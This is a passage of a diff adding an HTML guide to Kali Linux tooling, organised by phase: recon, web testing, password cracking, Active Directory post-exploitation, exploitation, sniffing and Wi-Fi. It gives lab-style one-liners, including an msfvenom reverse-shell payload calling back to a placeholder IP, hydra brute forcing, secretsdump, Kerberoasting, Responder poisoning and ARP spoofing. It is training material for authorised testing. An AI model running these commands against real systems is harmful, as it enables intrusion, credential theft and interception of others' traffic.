+<td>Recon, OSINT, network mapping</td>
+<td>"What is out there?"</td>
+</tr>
+<tr>
+<td><code>kali-tools-vulnerability</code></td>
+<td>Validation and vuln checks</td>
+<td>"What looks weak?"</td>
+</tr>
+<tr>
+<td><code>kali-tools-web</code></td>
+<td>Web app testing</td>
+<td>"What can I learn or break in HTTP land?"</td>
+</tr>
+<tr>
+<td><code>kali-tools-database</code></td>
+<td>DB-focused testing</td>
+<td>"How do I talk to or abuse databases?"</td>
+</tr>
+<tr>
+<td><code>kali-tools-passwords</code></td>
+<td>Cracking and online guessing</td>
+<td>"Can I recover or guess credentials?"</td>
+</tr>
+<tr>
+<td><code>kali-tools-wireless</code></td>
+<td>Wi-Fi, Bluetooth, RFID, SDR</td>
+<td>"What is happening off the wire?"</td>
+</tr>
+<tr>
+<td><code>kali-tools-reverse-engineering</code></td>
+<td>Binaries, malware, decompilation</td>
+<td>"What does this program really do?"</td>
+</tr>
+<tr>
+<td><code>kali-tools-exploitation</code></td>
+<td>Exploit frameworks and helpers</td>
+<td>"Can I turn weakness into access?"</td>
+</tr>
+<tr>
+<td><code>kali-tools-social-engineering</code></td>
+<td>User-targeted attack simulations</td>
+<td>"How do human factors affect security?"</td>
+</tr>
+<tr>
+<td><code>kali-tools-sniffing-spoofing</code></td>
+<td>MITM, packet capture, impersonation</td>
+<td>"Can I observe or manipulate traffic?"</td>
+</tr>
+<tr>
+<td><code>kali-tools-post-exploitation</code></td>
+<td>AD, privilege escalation, lateral movement</td>
+<td>"Now that I am in, what next?"</td>
+</tr>
+<tr>
+<td><code>kali-tools-forensics</code></td>
+<td>DFIR and evidence recovery</td>
+<td>"What happened here?"</td>
+</tr>
+<tr>
+<td><code>kali-tools-reporting</code></td>
+<td>Reporting, screenshots, collaboration</td>
+<td>"How do I prove what I found?"</td>
+</tr>
+</tbody>
+</table>
+<h3 id="specialized-kali-metapackages">Specialized Kali metapackages</h3>
+<p>These matter once you go beyond general web/network pentesting.</p>
+<table>
+<thead>
+<tr>
+<th>Metapackage</th>
+<th>Focus</th>
+<th>Example areas</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>kali-tools-gpu</code></td>
+<td>GPU-accelerated work</td>
+<td>Hash cracking</td>
+</tr>
+<tr>
+<td><code>kali-tools-hardware</code></td>
+<td>Hardware hacking</td>
+<td>USB, embedded, custom interfaces</td>
+</tr>
+<tr>
+<td><code>kali-tools-crypto-stego</code></td>
+<td>Cryptography and stego</td>
+<td>Hidden data, encoded artifacts</td>
+</tr>
+<tr>
+<td><code>kali-tools-fuzzing</code></td>
+<td>Protocol/app fuzzing</td>
+<td>Crash discovery, parser edge cases</td>
+</tr>
+<tr>
+<td><code>kali-tools-802-11</code></td>
+<td>Wi-Fi-specific tooling</td>
+<td>Monitor mode, captures, AP analysis</td>
+</tr>
+<tr>
+<td><code>kali-tools-bluetooth</code></td>
+<td>Bluetooth tooling</td>
+<td>BLE discovery and analysis</td>
+</tr>
+<tr>
+<td><code>kali-tools-rfid</code></td>
+<td>RFID and badge work</td>
+<td>Proxmark workflows</td>
+</tr>
+<tr>
+<td><code>kali-tools-sdr</code></td>
+<td>Software-defined radio</td>
+<td>RF analysis</td>
+</tr>
+<tr>
+<td><code>kali-tools-voip</code></td>
+<td>SIP/VoIP security</td>
+<td>Telephony testing</td>
+</tr>
+<tr>
+<td><code>kali-tools-windows-resources</code></td>
+<td>Windows-side resources</td>
+<td>Client-side or host-side tooling</td>
+</tr>
+</tbody>
+</table>
+<h3 id="the-smart-way-to-study-kali">The smart way to study Kali</h3>
+<p>Do not study it like this:</p>
+<ul>
+<li>"Today I will memorize 600 package names."</li>
+</ul>
+<p>Study it like this:</p>
+<ol>
+<li>Learn one workflow.</li>
+<li>Learn the 3-8 tools that dominate that workflow.</li>
+<li>Learn how the tool output feeds the next step.</li>
+<li>Learn how to write the finding up.</li>
+</ol>
+<p>That is exactly how the rest of this guide is organized.</p>
+<hr>
+<h2 id="3-how-to-explore-kali-without-getting-lost">3. How To Explore Kali Without Getting Lost</h2>
+<p>Kali becomes much easier once you stop relying only on the desktop menu.</p>
+<h3 id="useful-discovery-habits">Useful discovery habits</h3>
+<pre><code class="language-bash">apt search nmap
+apt show kali-tools-web
+man nmap
+nmap --help
+dpkg -L seclists | less
+ls /usr/share/wordlists
+ls /usr/share/seclists
+</code></pre>
+<h3 id="important-directories">Important directories</h3>
+<table>
+<thead>
+<tr>
+<th>Path</th>
+<th>Why it matters</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>/usr/share/wordlists/</code></td>
+<td>Built-in wordlists</td>
+</tr>
+<tr>
+<td><code>/usr/share/seclists/</code></td>
+<td>Large curated attack lists and discovery lists</td>
+</tr>
+<tr>
+<td><code>/usr/share/doc/</code></td>
+<td>Package documentation and examples</td>
+</tr>
+<tr>
+<td><code>/usr/bin/</code></td>
+<td>Most command-line tools</td>
+</tr>
+<tr>
+<td><code>/usr/share/kali-defaults/</code></td>
+<td>Helpful Kali defaults and desktop integration</td>
+</tr>
+</tbody>
+</table>
+<h3 id="a-simple-learn-any-tool-pattern">A simple "learn any tool" pattern</h3>
+<p>When you discover a new tool in Kali, ask:</p>
+<ol>
+<li>What problem does it solve?</li>
+<li>Is it passive, active, or exploitative?</li>
+<li>What input does it need?</li>
+<li>What output does it produce?</li>
+<li>What tool usually comes before it?</li>
+<li>What tool usually comes after it?</li>
+</ol>
+<p>Example with <code>nmap</code>:</p>
+<ul>
+<li>Before <code>nmap</code>: target definition, scope, maybe passive DNS</li>
+<li>During <code>nmap</code>: ports, services, versions, scripts</li>
+<li>After <code>nmap</code>: web tools, SMB tools, exploit lookup, reporting</li>
+</ul>
+<p>That is a Kali mindset: tools are part of a chain, not isolated tricks.</p>
+<hr>
+<h2 id="4-information-gathering-and-osint">4. Information Gathering and OSINT</h2>
+<p>This is where most good assessments begin. The goal is not just "find hosts". The goal is to build a believable model of the target surface.</p>
+<h3 id="typical-questions-in-this-phase">Typical questions in this phase</h3>
+<ul>
+<li>What domains and subdomains exist?</li>
+<li>What IPs, ports, and services are exposed?</li>
+<li>What technologies are in use?</li>
+<li>What clues are publicly available?</li>
+</ul>
+<h3 id="key-tools-to-learn">Key tools to learn</h3>
+<table>
+<thead>
+<tr>
+<th>Tool</th>
+<th>What it is for</th>
+<th>Lab-style example</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a href="https://www.kali.org/tools/nmap/">Nmap</a></td>
+<td>Network mapping, service detection, NSE scripts</td>
+<td><code>nmap -sV -Pn -oA edge-scan 192.0.2.10</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/masscan/">Masscan</a></td>
+<td>Very fast port scanning</td>
+<td><code>sudo masscan 192.0.2.0/24 -p1-1000 --rate 1000</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/amass/">Amass</a></td>
+<td>Passive and active external recon</td>
+<td><code>amass enum -passive -d example.com -o amass.txt</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/theharvester/">theHarvester</a></td>
+<td>Emails, hosts, names from public sources</td>
+<td><code>theHarvester -d example.com -b bing,crtsh</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/subfinder/">Subfinder</a></td>
+<td>Fast passive subdomain discovery</td>
+<td><code>subfinder -d example.com -silent</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/assetfinder/">Assetfinder</a></td>
+<td>Quick domain-related discovery</td>
+<td><code>assetfinder --subs-only example.com</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/dnsrecon/">dnsrecon</a></td>
+<td>DNS enumeration</td>
+<td><code>dnsrecon -d example.com</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/dnsenum/">dnsenum</a></td>
+<td>DNS and subdomain enumeration</td>
+<td><code>dnsenum example.com</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/recon-ng/">Recon-ng</a></td>
+<td>Modular recon workspace</td>
+<td><code>recon-ng</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/spiderfoot/">SpiderFoot</a></td>
+<td>Automated OSINT correlations</td>
+<td><code>spiderfoot -l 127.0.0.1:5001</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/httpx-toolkit/">httpx-toolkit</a></td>
+<td>Validate which discovered hosts are actually speaking HTTP(S)</td>
+<td><code>httpx-toolkit -l hosts.txt -title -tech-detect</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/whatweb/">WhatWeb</a></td>
+<td>Fingerprint web technologies</td>
+<td><code>whatweb http://192.0.2.10</code></td>
+</tr>
+</tbody>
+</table>
+<h3 id="mini-workflow-example">Mini-workflow example</h3>
+<p>Imagine you are assessing a lab domain called <code>example.com</code>.</p>
+<pre><code class="language-bash">subfinder -d example.com -silent &gt; subs.txt
+amass enum -passive -d example.com &gt;&gt; subs.txt
+sort -u subs.txt &gt; unique-subs.txt
+httpx-toolkit -l unique-subs.txt -title -tech-detect -o live-http.txt
+nmap -sV -Pn -iL resolved-ips.txt -oA perimeter
+</code></pre>
+<h3 id="what-to-learn-here">What to learn here</h3>
+<ul>
+<li>Difference between passive and active recon</li>
+<li>DNS records and subdomain sprawl</li>
+<li>Why validation matters after discovery</li>
+<li>Why "port open" is not the same thing as "interesting"</li>
+</ul>
+<h3 id="upstream-docs-worth-bookmarking">Upstream docs worth bookmarking</h3>
+<ul>
+<li>Nmap reference guide: <a href="https://nmap.org/book/man.html">https://nmap.org/book/man.html</a></li>
+</ul>
+<hr>
+<h2 id="5-vulnerability-validation-and-service-enumeration">5. Vulnerability Validation and Service Enumeration</h2>
+<p>Recon tells you what is there. This phase tells you what deserves attention.</p>
+<h3 id="key-tools-to-learn_1">Key tools to learn</h3>
+<table>
+<thead>
+<tr>
+<th>Tool</th>
+<th>What it is for</th>
+<th>Lab-style example</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a href="https://www.kali.org/tools/nuclei/">Nuclei</a></td>
+<td>Template-based checks for known exposures</td>
+<td><code>nuclei -u http://192.0.2.10</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/nikto/">Nikto</a></td>
+<td>Quick web server misconfiguration checks</td>
+<td><code>nikto -h http://192.0.2.10</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/sslscan/">sslscan</a></td>
+<td>TLS configuration review</td>
+<td><code>sslscan 192.0.2.10:443</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/testssl.sh/">testssl.sh</a></td>
+<td>Deep TLS and HTTPS testing</td>
+<td><code>testssl 192.0.2.10:443</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/enum4linux-ng/">enum4linux-ng</a></td>
+<td>SMB/Windows host enumeration</td>
+<td><code>enum4linux-ng -A 192.0.2.20</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/samba/">smbclient</a></td>
+<td>Browse shares and test SMB access</td>
+<td><code>smbclient -L //192.0.2.20 -N</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/samba/">rpcclient</a></td>
+<td>Query Windows/Samba RPC interfaces</td>
+<td><code>rpcclient -U \"\" -N 192.0.2.20</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/python-ldapdomaindump/">ldapdomaindump</a></td>
+<td>Dump LDAP/AD structure for review</td>
+<td><code>ldapdomaindump ldap://192.0.2.30 -u 'lab\\\\user' -p 'Password123!'</code></td>
+</tr>
+</tbody>
+</table>
+<h3 id="mini-workflow-example_1">Mini-workflow example</h3>
+<p>You scanned a host and found <code>80</code>, <code>443</code>, <code>445</code>, and <code>389</code>.</p>
+<pre><code class="language-bash">nikto -h http://192.0.2.20
+nuclei -u https://192.0.2.20
+sslscan 192.0.2.20:443
+enum4linux-ng -A 192.0.2.20
+smbclient -L //192.0.2.20 -N
+</code></pre>
+<h3 id="what-to-learn-here_1">What to learn here</h3>
+<ul>
+<li>Validate findings instead of blindly trusting scanners</li>
+<li>Understand false positives and noisy results</li>
+<li>Learn protocol-specific enumeration habits</li>
+<li>Keep raw output because it becomes report evidence later</li>
+</ul>
+<hr>
+<h2 id="6-web-application-testing">6. Web Application Testing</h2>
+<p>Kali is extremely strong for web work. This is where many people spend most of their time because web apps give you breadth: HTTP, auth, sessions, APIs, files, SSRF, deserialization, and more.</p>
+<h3 id="key-tools-to-learn_2">Key tools to learn</h3>
+<table>
+<thead>
+<tr>
+<th>Tool</th>
+<th>What it is for</th>
+<th>Lab-style example</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a href="https://www.kali.org/tools/burpsuite/">Burp Suite</a></td>
+<td>Intercepting proxy and manual testing platform</td>
+<td><code>burpsuite</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/zaproxy/">OWASP ZAP</a></td>
+<td>Proxy, active scan, automation</td>
+<td><code>zaproxy</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/gobuster/">Gobuster</a></td>
+<td>Directory, vhost, DNS brute forcing</td>
+<td><code>gobuster dir -u http://192.0.2.10 -w /usr/share/seclists/Discovery/Web-Content/common.txt</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/ffuf/">ffuf</a></td>
+<td>Fast content and parameter fuzzing</td>
+<td><code>ffuf -u http://192.0.2.10/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/wfuzz/">Wfuzz</a></td>
+<td>Flexible web fuzzing</td>
+<td><code>wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/common.txt --hc 404 http://192.0.2.10/FUZZ</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/feroxbuster/">Feroxbuster</a></td>
+<td>Recursive content discovery</td>
+<td><code>feroxbuster -u http://192.0.2.10 -w /usr/share/seclists/Discovery/Web-Content/common.txt</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/dirsearch/">dirsearch</a></td>
+<td>Web path enumeration</td>
+<td><code>dirsearch -u http://192.0.2.10</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/whatweb/">WhatWeb</a></td>
+<td>Tech fingerprinting</td>
+<td><code>whatweb http://192.0.2.10</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/sqlmap/">sqlmap</a></td>
+<td>SQL injection testing and exploitation in labs</td>
+<td><code>sqlmap -u 'http://dvwa.local/vulnerabilities/sqli/?id=1&amp;Submit=Submit' --batch</code></td>
+</tr>
+</tbody>
+</table>
+<h3 id="mini-scenario">Mini-scenario</h3>
+<p>Suppose you are testing a training target and want to understand the app before you attack it:</p>
+<pre><code class="language-bash">whatweb http://192.0.2.10
+gobuster dir -u http://192.0.2.10 -w /usr/share/seclists/Discovery/Web-Content/common.txt
+ffuf -u http://192.0.2.10/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
+burpsuite
+</code></pre>
+<h3 id="how-to-think-in-this-phase">How to think in this phase</h3>
+<ul>
+<li>Proxy first, automate second</li>
+<li>Learn the app manually before you trust a scanner</li>
+<li>Separate content discovery from vulnerability validation</li>
+<li>Keep screenshots, requests, and reproduction steps</li>
+</ul>
+<h3 id="upstream-docs-worth-bookmarking_1">Upstream docs worth bookmarking</h3>
+<ul>
+<li>Burp Suite docs: <a href="https://portswigger.net/burp/documentation">https://portswigger.net/burp/documentation</a></li>
+<li>OWASP ZAP docs: <a href="https://www.zaproxy.org/docs/">https://www.zaproxy.org/docs/</a></li>
+</ul>
+<hr>
+<h2 id="7-password-attacks-and-wordlists">7. Password Attacks and Wordlists</h2>
+<p>Credential work is a huge part of Kali. Sometimes you are cracking offline hashes. Sometimes you are testing password reuse. Sometimes you are building custom wordlists from the target itself.</p>
+<h3 id="key-tools-to-learn_3">Key tools to learn</h3>
+<table>
+<thead>
+<tr>
+<th>Tool</th>
+<th>What it is for</th>
+<th>Lab-style example</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a href="https://www.kali.org/tools/hashcat/">Hashcat</a></td>
+<td>GPU-friendly offline cracking</td>
+<td><code>hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/john/">John</a></td>
+<td>Flexible offline cracking and format conversion helpers</td>
+<td><code>john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/hydra/">Hydra</a></td>
+<td>Online login guessing in labs</td>
+<td><code>hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.0.2.20</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/cewl/">CeWL</a></td>
+<td>Build wordlists from website content</td>
+<td><code>cewl http://192.0.2.10 -w custom.txt</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/crunch/">Crunch</a></td>
+<td>Generate candidate passwords by pattern</td>
+<td><code>crunch 8 8 abc123 -o candidates.txt</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/seclists/">SecLists</a></td>
+<td>Curated lists for wordlists, fuzzing, usernames, paths</td>
+<td><code>ls /usr/share/seclists</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/aircrack-ng/">aircrack-ng</a></td>
+<td>Wi-Fi key cracking and capture utilities</td>
+<td><code>aircrack-ng capture.cap -w /usr/share/wordlists/rockyou.txt</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/hcxtools/">hcxtools</a></td>
+<td>Convert Wi-Fi captures for Hashcat</td>
+<td><code>hcxpcapngtool -o hashes.22000 capture.pcapng</code></td>
+</tr>
+</tbody>
+</table>
+<h3 id="mini-workflow-example_2">Mini-workflow example</h3>
+<pre><code class="language-bash">cewl http://intranet.lab -w target-words.txt
+cat /usr/share/wordlists/rockyou.txt target-words.txt | sort -u &gt; merged.txt
+john hashes.txt --wordlist=merged.txt
+</code></pre>
+<h3 id="what-to-learn-here_2">What to learn here</h3>
+<ul>
+<li>Online versus offline attacks</li>
+<li>Why rate limits matter</li>
+<li>Why custom wordlists often beat giant generic lists</li>
+<li>How to identify hash types before you crack them</li>
+</ul>
+<h3 id="upstream-docs-worth-bookmarking_2">Upstream docs worth bookmarking</h3>
+<ul>
+<li>Hashcat wiki: <a href="https://hashcat.net/wiki/">https://hashcat.net/wiki/</a></li>
+<li>John jumbo docs: <a href="https://www.openwall.com/john/doc/">https://www.openwall.com/john/doc/</a></li>
+</ul>
+<hr>
+<h2 id="8-windows-active-directory-and-post-exploitation">8. Windows, Active Directory, and Post-Exploitation</h2>
+<p>Kali is now very strong for AD and Windows-centric work. This is one of the biggest reasons modern security teams keep Kali around even when they run many other distros.</p>
+<h3 id="key-tools-to-learn_4">Key tools to learn</h3>
+<table>
+<thead>
+<tr>
+<th>Tool</th>
+<th>What it is for</th>
+<th>Lab-style example</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a href="https://www.kali.org/tools/netexec/">NetExec</a></td>
+<td>Modern network execution and AD-aware enumeration</td>
+<td><code>netexec smb 192.0.2.30 -u analyst -p 'Password123!'</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/crackmapexec/">CrackMapExec</a></td>
+<td>Older but still common CME workflow</td>
+<td><code>crackmapexec smb 192.0.2.30 -u analyst -p 'Password123!'</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/impacket/">Impacket</a></td>
+<td>AD and Windows protocol tooling</td>
+<td><code>impacket-secretsdump lab.local/analyst:Password123!@192.0.2.10</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/impacket-scripts/">Impacket scripts</a></td>
+<td>Kerberos, SMB, MSSQL, NTLM relay, remote exec</td>
+<td><code>impacket-GetUserSPNs lab.local/analyst:Password123! -dc-ip 192.0.2.10 -request</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/bloodhound-ce-python/">BloodHound CE Python</a></td>
+<td>Collect AD relationship data for BloodHound</td>
+<td><code>bloodhound-ce-python -d lab.local -u analyst -p 'Password123!' -ns 192.0.2.10 -c all</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/bloodhound/">BloodHound</a></td>
+<td>Graph AD relationships</td>
+<td><code>bloodhound</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/certipy-ad/">Certipy-ad</a></td>
+<td>AD CS and certificate abuse analysis</td>
+<td><code>certipy-ad find -u analyst@lab.local -p 'Password123!' -dc-ip 192.0.2.10</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/enum4linux-ng/">enum4linux-ng</a></td>
+<td>Quick SMB/Windows enumeration</td>
+<td><code>enum4linux-ng -A 192.0.2.30</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/python-ldapdomaindump/">ldapdomaindump</a></td>
+<td>Dump LDAP domain structure</td>
+<td><code>ldapdomaindump ldap://192.0.2.10 -u 'lab\\\\analyst' -p 'Password123!'</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/evil-winrm-py/">evil-winrm-py</a></td>
+<td>WinRM access in labs</td>
+<td><code>evil-winrm-py -i 192.0.2.30 -u analyst -p 'Password123!'</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/responder/">Responder</a></td>
+<td>LLMNR/NBT-NS poisoning and credential capture in an isolated lab</td>
+<td><code>sudo responder -I eth0</code></td>
+</tr>
+</tbody>
+</table>
+<h3 id="mini-workflow-example_3">Mini-workflow example</h3>
+<pre><code class="language-bash">enum4linux-ng -A 192.0.2.30
+netexec smb 192.0.2.30 -u analyst -p 'Password123!'
+impacket-GetUserSPNs lab.local/analyst:Password123! -dc-ip 192.0.2.10 -request
+bloodhound-ce-python -d lab.local -u analyst -p 'Password123!' -ns 192.0.2.10 -c all
+</code></pre>
+<h3 id="what-to-learn-here_3">What to learn here</h3>
+<ul>
+<li>SMB, LDAP, Kerberos, WinRM, and MSSQL as separate protocol surfaces</li>
+<li>Why AD is mostly about relationships, not just credentials</li>
+<li>How enumeration becomes path analysis</li>
+<li>Why almost every AD finding needs careful proof and careful scope handling</li>
+</ul>
+<hr>
+<h2 id="9-exploitation-frameworks-and-exploit-research">9. Exploitation Frameworks and Exploit Research</h2>
+<p>This is the part many beginners jump to first, but it makes the most sense after recon and validation.</p>
+<h3 id="key-tools-to-learn_5">Key tools to learn</h3>
+<table>
+<thead>
+<tr>
+<th>Tool</th>
+<th>What it is for</th>
+<th>Lab-style example</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a href="https://www.kali.org/tools/exploitdb/">ExploitDB / Searchsploit</a></td>
+<td>Local exploit research against discovered versions</td>
+<td><code>searchsploit apache 2.4</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/metasploit-framework/">Metasploit Framework</a></td>
+<td>Exploit framework, payloads, sessions, scanners</td>
+<td><code>msfconsole</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/metasploit-framework/">msfvenom</a></td>
+<td>Payload generation in labs</td>
+<td><code>msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.0.2.50 LPORT=4444 -f elf -o payload.elf</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/sqlmap/">sqlmap</a></td>
+<td>Exploit verified SQLi in training apps</td>
+<td><code>sqlmap -u 'http://dvwa.local/vulnerabilities/sqli/?id=1' --batch</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/pacu/">Pacu</a></td>
+<td>AWS exploitation and auditing framework</td>
+<td><code>pacu</code></td>
+</tr>
+</tbody>
+</table>
+<h3 id="mini-workflow-example_4">Mini-workflow example</h3>
+<p>You used <code>nmap</code> and saw a version string. Now validate and research before you touch Metasploit:</p>
+<pre><code class="language-bash">searchsploit openssh 8
+msfconsole
+</code></pre>
+<h3 id="metasploit-concepts-worth-mastering">Metasploit concepts worth mastering</h3>
+<ul>
+<li>Workspaces</li>
+<li>Auxiliary modules</li>
+<li>Exploit modules</li>
+<li>Payloads</li>
+<li>Sessions</li>
+<li>Loot</li>
+<li>Post modules</li>
+</ul>
+<h3 id="upstream-docs-worth-bookmarking_3">Upstream docs worth bookmarking</h3>
+<ul>
+<li>Metasploit docs: <a href="https://docs.metasploit.com/">https://docs.metasploit.com/</a></li>
+</ul>
+<hr>
+<h2 id="10-sniffing-spoofing-and-relay-attacks">10. Sniffing, Spoofing, and Relay Attacks</h2>
+<p>This is where Kali feels like a true network security platform. You capture traffic, inspect protocols, manipulate paths, and observe what systems trust by default.</p>
+<h3 id="key-tools-to-learn_6">Key tools to learn</h3>
+<table>
+<thead>
+<tr>
+<th>Tool</th>
+<th>What it is for</th>
+<th>Lab-style example</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a href="https://www.kali.org/tools/tcpdump/">tcpdump</a></td>
+<td>Fast packet capture from the shell</td>
+<td><code>sudo tcpdump -i eth0 -nn host 192.0.2.10</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/wireshark/">Wireshark / Tshark</a></td>
+<td>Deep packet inspection and filtered analysis</td>
+<td><code>tshark -r capture.pcapng</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/bettercap/">Bettercap</a></td>
+<td>MITM, proxying, sniffing, network manipulation</td>
+<td><code>sudo bettercap -iface eth0</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/ettercap/">Ettercap</a></td>
+<td>MITM and protocol-aware interception</td>
+<td><code>sudo ettercap -T -M arp:remote /192.0.2.10// /192.0.2.1//</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/responder/">Responder</a></td>
+<td>Name resolution poisoning in Windows labs</td>
+<td><code>sudo responder -I eth0</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/netsniff-ng/">netsniff-ng</a></td>
+<td>High-performance sniffing and traffic generation</td>
+<td><code>sudo netsniff-ng -i eth0</code></td>
+</tr>
+</tbody>
+</table>
+<h3 id="mini-scenario_1">Mini-scenario</h3>
+<p>You want to understand what a chatty lab subnet is doing before you choose a next step:</p>
+<pre><code class="language-bash">sudo tcpdump -i eth0 -nn net 192.0.2.0/24
+wireshark
+</code></pre>
+<h3 id="what-to-learn-here_4">What to learn here</h3>
+<ul>
+<li>Capture filters versus display filters</li>
+<li>Broadcast, multicast, ARP, DNS, and name resolution behavior</li>
+<li>Why relay-style attacks depend on trust paths, not just packets</li>
+<li>Why lab isolation matters for these tools more than almost any other category</li>
+</ul>
+<h3 id="upstream-docs-worth-bookmarking_4">Upstream docs worth bookmarking</h3>
+<ul>
+<li>Wireshark docs: <a href="https://www.wireshark.org/docs/">https://www.wireshark.org/docs/</a></li>
+</ul>
+<hr>
+<h2 id="11-wireless-bluetooth-rfid-sdr-and-hardware">11. Wireless, Bluetooth, RFID, SDR, and Hardware</h2>
+<p>This is one of Kali's signature strengths. Many distros can run web or Nmap tooling. Fewer are packaged and tuned for wireless injection, RF work, or badge tooling.</p>
+<h3 id="key-tools-to-learn_7">Key tools to learn</h3>
+<table>
+<thead>
+<tr>
+<th>Tool</th>
+<th>What it is for</th>
+<th>Lab-style example</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a href="https://www.kali.org/tools/aircrack-ng/">aircrack-ng</a></td>
+<td>Wi-Fi capture, injection, cracking helpers</td>
+<td><code>sudo airmon-ng start wlan0</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/hcxtools/">hcxtools</a></td>
+<td>Convert modern Wi-Fi captures for cracking</td>
+<td><code>hcxpcapngtool -o hashes.22000 capture.pcapng</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/kismet/">Kismet</a></td>
+<td>Wireless discovery and multi-source capture</td>
+<td><code>kismet</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/wifite/">Wifite</a></td>
+<td>Guided Wi-Fi auditing workflow in labs</td>
+<td><code>sudo wifite</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/reaver/">Reaver</a></td>
+<td>WPS auditing in labs</td>
+<td><code>reaver -i wlan0mon -b 00:11:22:33:44:55</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/bully/">Bully</a></td>
+<td>Alternative WPS auditing tool</td>
+<td><code>bully wlan0mon -b 00:11:22:33:44:55</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/blue-hydra/">Blue Hydra</a></td>
+<td>Bluetooth and BLE discovery</td>
+<td><code>blue_hydra</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/proxmark3/">Proxmark3</a></td>
+<td>RFID and badge research</td>
+<td><code>proxmark3</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/gqrx-sdr/">gqrx-sdr</a></td>
+<td>SDR signal visualization</td>
+<td><code>gqrx</code></td>
+</tr>
+<tr>
+<td><a href="https://www.kali.org/tools/wifipumpkin3/">wifipumpkin3</a></td>
+<td>Rogue AP lab framework</td>
+<td><code>sudo wifipumpkin3</code></td>
+</tr>
+</tbody>
+</table>
+<h3 id="wi-fi-mini-workflow-example">Wi-Fi mini-workflow example</h3>
+<p>Only do this against your own AP or an explicit wireless lab:</p>
+<pre><code class="language-bash">sudo airmon-ng start wlan0
+sudo airodump-ng wlan0mon
+sudo hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1
+hcxpcapngtool -o hashes.22000 capture.pcapng
